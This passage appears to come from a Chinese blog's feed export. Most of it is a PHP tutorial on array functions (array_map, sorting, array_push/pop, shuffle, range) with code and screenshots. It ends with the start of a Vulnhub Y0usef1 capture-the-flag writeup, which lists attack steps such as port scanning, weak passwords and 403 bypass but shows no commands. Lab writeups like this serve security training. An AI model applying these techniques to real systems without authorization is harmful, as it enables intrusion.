</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span> = [<span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;petter&#x27;</span>, <span class="string">&#x27;age&#x27;</span>=&gt;<span class="number">28</span>, <span class="string">&#x27;city&#x27;</span>=&gt;<span class="string">&#x27;beijing&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">print_arr</span>(<span class="params"><span class="variable">$val</span>, <span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$key</span>.<span class="string">&#x27; =&gt; &#x27;</span>.<span class="variable">$val</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">alter_arr</span>(<span class="params">&amp;<span class="variable">$val</span>, <span class="variable">$key</span>, <span class="variable">$para</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$val</span> .= <span class="variable">$para</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array_walk(<span class="variable">$arr</span>, <span class="string">&#x27;print_arr&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;更新数组&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">array_walk(<span class="variable">$arr</span>, <span class="string">&#x27;alter_arr&#x27;</span>, <span class="string">&#x27;_php&#x27;</span>);</span><br><span class="line">array_walk(<span class="variable">$arr</span>, <span class="string">&#x27;print_arr&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221118161651.png" /></p>
<p>需要注意：</p>
<ul>
<li>回调函数的参数中，值是第一个参数，键是第二个参数；</li>
<li>如果需要更新数组，则值的传入应该是引用传递，不能修改键；</li>
</ul>
<hr />
<ol start="8" type="1">
<li><strong><code>array_map(callback, $arr1, $arr2, ...)</code>
：将回调函数作用在多个数组上，返回值是默认索引数组，回调函数的参数数量，必须与处理的数组数量一致，且顺序对应；</strong></li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr1</span> = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line"><span class="variable">$arr2</span> = [<span class="string">&#x27;fuzhou&#x27;</span>, <span class="string">&#x27;beijing&#x27;</span>, <span class="string">&#x27;xian&#x27;</span>, <span class="string">&#x27;xiamen&#x27;</span>, <span class="string">&#x27;shanghai&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func1</span>(<span class="params"><span class="variable">$val</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$val</span> * <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func2</span>(<span class="params"><span class="variable">$val1</span>, <span class="variable">$val2</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;第&#x27;</span>.<span class="variable">$val1</span>.<span class="string">&#x27;个城市是：&#x27;</span>.<span class="variable">$val2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$new_arr1</span> = array_map(<span class="string">&#x27;func1&#x27;</span>, <span class="variable">$arr1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">print_r(<span class="variable">$new_arr1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$new_arr2</span> = array_map(<span class="string">&#x27;func2&#x27;</span>, <span class="variable">$arr1</span>, <span class="variable">$arr2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">print_r(<span class="variable">$new_arr2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221118162632.png" /></p>
<p>该函数把数组的值传入回调函数，键没有传入。</p>
<hr />
<ol start="9" type="1">
<li><strong><code>sort($arr)</code> 和 <code>rsort($arr)</code>
：忽略原键名，按元素值从小到大（从大到小——逆序）排序，直接修改原数组，把原数组的键名变为默认索引；</strong></li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$arr1</span> = [<span class="number">23</span>, <span class="number">3</span>, <span class="number">57</span>, <span class="number">1</span>, <span class="number">10</span>];</span><br><span class="line"><span class="variable">$arr2</span> = [<span class="string">&#x27;html&#x27;</span>, <span class="string">&#x27;css&#x27;</span>, <span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;javascript&#x27;</span>, <span class="string">&#x27;mysql&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;正序&lt;br&gt;&#x27;</span>;</span><br><span class="line">sort(<span class="variable">$arr1</span>);</span><br><span class="line">sort(<span class="variable">$arr2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">print_r(<span class="variable">$arr1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">print_r(<span class="variable">$arr2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;逆序&lt;br&gt;&#x27;</span>;</span><br><span class="line">rsort(<span class="variable">$arr1</span>);</span><br><span class="line">rsort(<span class="variable">$arr2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">print_r(<span class="variable">$arr1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">print_r(<span class="variable">$arr2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221118163150.png" /></p>
<hr />
<ol start="10" type="1">
<li><strong><code>asort($arr)</code> 和 <code>arsort($arr)</code>
：数组排序时保持键值对的对应关系不变，除此以外同上；</strong></li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$arr1</span> = [<span class="number">23</span>, <span class="number">3</span>, <span class="number">57</span>, <span class="number">1</span>, <span class="number">10</span>];</span><br><span class="line"><span class="variable">$arr2</span> = [<span class="string">&#x27;1&#x27;</span>=&gt;<span class="string">&#x27;html&#x27;</span>, <span class="string">&#x27;a&#x27;</span>=&gt;<span class="string">&#x27;css&#x27;</span>, <span class="string">&#x27;c&#x27;</span>=&gt;<span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;4&#x27;</span>=&gt;<span class="string">&#x27;javascript&#x27;</span>, <span class="string">&#x27;5&#x27;</span>=&gt;<span class="string">&#x27;mysql&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;正序&lt;br&gt;&#x27;</span>;</span><br><span class="line">asort(<span class="variable">$arr1</span>);</span><br><span class="line">asort(<span class="variable">$arr2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">print_r(<span class="variable">$arr1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">print_r(<span class="variable">$arr2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;逆序&lt;br&gt;&#x27;</span>;</span><br><span class="line">arsort(<span class="variable">$arr1</span>);</span><br><span class="line">arsort(<span class="variable">$arr2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">print_r(<span class="variable">$arr1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">print_r(<span class="variable">$arr2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221118163446.png" /></p>
<hr />
<ol start="11" type="1">
<li><strong><code>ksort($arr)</code> 和 <code>krsort($arr)</code>
：根据键名进行排序；</strong></li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$arr1</span> = [<span class="number">23</span>, <span class="number">3</span>, <span class="number">57</span>, <span class="number">1</span>, <span class="number">10</span>];</span><br><span class="line"><span class="variable">$arr2</span> = [<span class="string">&#x27;1&#x27;</span>=&gt;<span class="string">&#x27;html&#x27;</span>, <span class="string">&#x27;a&#x27;</span>=&gt;<span class="string">&#x27;css&#x27;</span>, <span class="string">&#x27;c&#x27;</span>=&gt;<span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;4&#x27;</span>=&gt;<span class="string">&#x27;javascript&#x27;</span>, <span class="string">&#x27;5&#x27;</span>=&gt;<span class="string">&#x27;mysql&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;正序&lt;br&gt;&#x27;</span>;</span><br><span class="line">ksort(<span class="variable">$arr1</span>);</span><br><span class="line">ksort(<span class="variable">$arr2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">print_r(<span class="variable">$arr1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">print_r(<span class="variable">$arr2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;逆序&lt;br&gt;&#x27;</span>;</span><br><span class="line">krsort(<span class="variable">$arr1</span>);</span><br><span class="line">krsort(<span class="variable">$arr2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">print_r(<span class="variable">$arr1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">print_r(<span class="variable">$arr2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221118163659.png" /></p>
<hr />
<ol start="12" type="1">
<li><strong><code>array_multisort($arr1, $arr2, ...)</code>
：同时对多个数组或多维数组进行排序；</strong></li>
</ol>
<p>对多个数组进行排序：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr1</span> = [<span class="number">23</span>, <span class="number">3</span>, <span class="number">57</span>, <span class="number">1</span>, <span class="number">10</span>];</span><br><span class="line"><span class="variable">$arr2</span> = [<span class="string">&#x27;1&#x27;</span>=&gt;<span class="string">&#x27;html&#x27;</span>, <span class="string">&#x27;a&#x27;</span>=&gt;<span class="string">&#x27;css&#x27;</span>, <span class="string">&#x27;c&#x27;</span>=&gt;<span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;4&#x27;</span>=&gt;<span class="string">&#x27;javascript&#x27;</span>, <span class="string">&#x27;5&#x27;</span>=&gt;<span class="string">&#x27;mysql&#x27;</span>];</span><br><span class="line"></span><br><span class="line">array_multisort(<span class="variable">$arr1</span>, <span class="variable">$arr2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">print_r(<span class="variable">$arr1</span>);</span><br><span class="line">print_r(<span class="variable">$arr2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221118164235.png" /></p>
<p>对多维数组进行排序：</p>
<ol type="1">
<li>将多维数组拆分为多个一维数组 （如何拆分看个人）；</li>
<li>使用 <code>array_multisort()</code>
对多个一维数组排序，并整合；</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span> = [</span><br><span class="line">    [<span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;takagi&#x27;</span>, <span class="string">&#x27;age&#x27;</span>=&gt;<span class="number">18</span>],</span><br><span class="line">    [<span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;m1uk&#x27;</span>, <span class="string">&#x27;age&#x27;</span>=&gt;<span class="number">20</span>],</span><br><span class="line">    [<span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;bob&#x27;</span>, <span class="string">&#x27;age&#x27;</span>=&gt;<span class="number">20</span>],</span><br><span class="line">    [<span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;alice&#x27;</span>, <span class="string">&#x27;age&#x27;</span>=&gt;<span class="number">18</span>]</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>)&#123;</span><br><span class="line">    <span class="variable">$name</span>[<span class="variable">$key</span>] = <span class="variable">$val</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$age</span>[<span class="variable">$key</span>] = <span class="variable">$val</span>[<span class="string">&#x27;age&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array_multisort(<span class="variable">$age</span>, SORT_ASC, <span class="variable">$name</span>, SORT_DESC, <span class="variable">$arr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">print_r(<span class="variable">$arr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221118164653.png" /></p>
<p>先根据第一个数组进行排序，如果相同再考虑第二个数组，把两个数组排序的结果整合到
<code>$arr</code> 中。</p>
<hr />
<ol start="13" type="1">
<li><strong><code>array_push()</code> 和 <code>array_pop</code>
：栈的入栈和出栈，前者的返回值是数组长度，后者的返回值是出栈元素值；</strong>
<ol type="1">
<li>入栈的元素总是数字索引</li>
</ol></li>
</ol>
<p>入栈操作：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span> = [<span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;petter&#x27;</span>, <span class="string">&#x27;age&#x27;</span>=&gt;<span class="number">28</span>, <span class="string">&#x27;city&#x27;</span>=&gt;<span class="string">&#x27;beijing&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;1. 当前数组的长度是：&#x27;</span>.array_push(<span class="variable">$arr</span>, <span class="string">&#x27;fuzhou&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">print_r(<span class="variable">$arr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;2. 当前数组的长度是：&#x27;</span>.array_push(<span class="variable">$arr</span>, [<span class="number">100</span>, <span class="number">200</span>, <span class="number">1</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">print_r(<span class="variable">$arr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;3. 当前数组的长度是：&#x27;</span>.array_push(<span class="variable">$arr</span>, <span class="string">&#x27;123&#x27;</span>, <span class="string">&#x27;456&#x27;</span>, <span class="string">&#x27;789&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">print_r(<span class="variable">$arr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221118165239.png" /></p>
<p>出栈操作：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span> = [<span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;petter&#x27;</span>, <span class="string">&#x27;age&#x27;</span>=&gt;<span class="number">28</span>, <span class="string">&#x27;city&#x27;</span>=&gt;<span class="string">&#x27;beijing&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;1. 当前出栈元素：&#x27;</span>.array_pop(<span class="variable">$arr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">print_r(<span class="variable">$arr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;2. 当前出栈元素：&#x27;</span>.array_pop(<span class="variable">$arr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">print_r(<span class="variable">$arr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;3. 当前出栈元素：&#x27;</span>.array_pop(<span class="variable">$arr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">print_r(<span class="variable">$arr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221118165342.png" /></p>
<hr />
<ol start="15" type="1">
<li><strong><code>array_shift()</code> 和 <code>array_unshift()</code>
：前者是出队，后者是入队，出队的返回值是出队元素的值，入队的返回值是数组的长度；</strong></li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span> = [<span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;petter&#x27;</span>, <span class="string">&#x27;age&#x27;</span>=&gt;<span class="number">28</span>, <span class="string">&#x27;city&#x27;</span>=&gt;<span class="string">&#x27;beijing&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;出队元素是：&#x27;</span>.array_shift(<span class="variable">$arr</span>).<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;出队元素是：&#x27;</span>.array_shift(<span class="variable">$arr</span>).<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;数组长度：&#x27;</span>.array_unshift(<span class="variable">$arr</span>, <span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;mysql&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">print_r(<span class="variable">$arr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221118170005.png" /></p>
<p>需要注意，这里的入队不是真正意义的入队，这里的入队是往队头加元素，真正意义的入队是
<code>array_push()</code>。</p>
<hr />
<ol start="16" type="1">
<li><code>array_rand()</code>、<code>array_sum()</code>、<code>shuffle()</code>
和 <code>range()</code></li>
</ol>
<p><code>array_rand($arr[, $num])</code>
：随机从数组中取出一个或多个键名，默认取一个，如果只取一个，返回值就是键名，如果取多个，返回值是一个值为键名的默认索引数组；</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span> = [<span class="string">&#x27;html&#x27;</span>, <span class="string">&#x27;css&#x27;</span>, <span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;javascript&#x27;</span>, <span class="string">&#x27;mysql&#x27;</span>];</span><br><span class="line"><span class="variable">$key1</span> = array_rand(<span class="variable">$arr</span>);</span><br><span class="line"><span class="variable">$key2</span> = array_rand(<span class="variable">$arr</span>, <span class="number">3</span>);</span><br><span class="line">print_r(<span class="variable">$key1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">print_r(<span class="variable">$key2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221118195421.png" /></p>
<p><code>shuffle($arr)</code>
：将数组乱序输出，原有键名全部删除，按默认索引重新排序，返回布尔值，成功为
1，失败为 0；</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span> = [<span class="string">&#x27;lang&#x27;</span>=&gt;<span class="string">&#x27;html&#x27;</span>, <span class="string">&#x27;d&#x27;</span>=&gt;<span class="string">&#x27;css&#x27;</span>, <span class="string">&#x27;fsadf&#x27;</span>=&gt;<span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;jef&#x27;</span>=&gt;<span class="string">&#x27;javascript&#x27;</span>, <span class="string">&#x27;dsfas&#x27;</span>=&gt;<span class="string">&#x27;mysql&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;原来数组如下：&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">print_r(<span class="variable">$arr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(shuffle(<span class="variable">$arr</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;数组打乱后，新数组如下：&lt;br&gt;&#x27;</span>;</span><br><span class="line">    print_r(<span class="variable">$arr</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;数组打乱失败&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221118200012.png" /></p>
<p><code>array_sum($arr)</code>
：数组求和，如果遇到非数值，则会自动进行类型转换。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> array_sum([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> array_sum([<span class="number">1</span>, <span class="string">&#x27;2&#x27;</span>, <span class="number">3</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> array_sum([<span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;23php&#x27;</span>, <span class="number">3</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221118200211.png" /></p>
<p><code>range(start, end, dis)</code> ：生成范围在
<code>[start, end]</code> 数组， <code>dis</code> 表示步长，默认为
1。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$arr1</span> = range(<span class="number">1</span>, <span class="number">10</span>);</span><br><span class="line"><span class="variable">$arr2</span> = range(<span class="number">1</span>, <span class="number">10</span>, <span class="number">3</span>);</span><br><span class="line"><span class="variable">$arr3</span> = range(<span class="number">10</span>, <span class="number">1</span>, -<span class="number">3</span>);  <span class="comment"># 等价于 $arr3 = range(10, 1, 3)；</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">print_r(<span class="variable">$arr1</span>);</span><br><span class="line">print_r(<span class="variable">$arr2</span>);</span><br><span class="line">print_r(<span class="variable">$arr3</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><code>start</code> 可能小于
<code>end</code>，步长为正为负无所谓。</p>
]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php基础</tag>
      </tags>
  </entry>
  <entry>
    <title>8 Vulnhub Y0usef1 Writeup</title>
    <url>/2022/04/09/8%20Vulnhub%20Y0usef1%20Writeup/</url>
    <content><![CDATA[<p>该靶机难度为简单。</p>
<span id="more"></span>
<h1 id="靶机信息">靶机信息</h1>
<p>靶机地址：<a
href="https://www.vulnhub.com/entry/y0usef-1,624/">y0usef</a></p>
<p>难度：Easy（难度低说明日常中最常见的漏洞）</p>
<p>目标：取得root权限 + 2Flag</p>
<p>涉及攻击方法：</p>
<ul>
<li>主机发现</li>
<li>端口扫描</li>
<li>Web信息收集</li>
<li>弱口令</li>
<li><strong>指纹探测</strong></li>
<li><strong>403 Bypass</strong></li>
